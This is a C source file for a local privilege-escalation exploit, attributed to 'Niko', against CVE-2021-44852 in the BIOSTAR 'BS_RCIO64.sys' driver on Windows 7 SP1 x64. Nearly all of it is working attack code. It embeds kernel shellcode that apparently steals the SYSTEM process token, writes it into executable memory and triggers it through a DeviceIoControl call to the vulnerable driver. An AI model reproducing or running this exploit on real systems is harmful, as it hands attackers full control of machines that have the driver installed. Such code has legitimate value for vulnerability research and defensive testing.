#include "exploit.h"

unsigned char assembly[] =
{
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x88, 0x01, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x8B, 0x80, 0x01, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0x08, 0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0x08, 0x02, 0x00, 0x00, 0xC3
};

int main(int argc, char** argv)
{
	void* device_handle = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	void* payload = (void*)0;
	unsigned char unused = 0;

	SetConsoleTitleA("CVE-2021-44852");

	printf("[*] BIOSTAR RACING GT EVO \"BS_RCIO64.sys\" Untrusted Function Execution Elevation of Privilege Vulnerability\n[*] This exploit is written for Windows 7 SP1 x64-86\n[*] Exploit written by Niko\n[!] Let's exploit!");

	if (device_handle == (void*)-1)
	{
		printf("\n[-] Failed to obtain a handle to the \"%s\" symbolic link. Error: %d (0x%x)", TARGET_DEVICE, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"%s\" symbolic link. Handle Value: 0x%p", TARGET_DEVICE, device_handle);

	if (!(payload = VirtualAlloc(0, sizeof(assembly), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
	{
		printf("\n[-] Failed to allocate executable memory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated executable memory. Allocation Address: 0x%p", payload);

	memcpy_s(payload, sizeof(assembly), assembly, sizeof(assembly));
	printf("\n[+] Initialized the kernel payload.");

	// TEMP (This will be finalized tomorrow!)
	unsigned char output[64];
	unsigned long bytes_returned = 0;
	printf("\n[debug] press enter to do the thing...");
	getchar();
	DeviceIoControl(device_handle, TARGET_IO_CONTROL, &payload, 8, output, sizeof(output), &bytes_returned, 0);
	// TEMP (This will be finalized tomorrow!)

	printf("\n[+] Exploitation has completed successfully.");
	unused = getchar();
	return 0;
}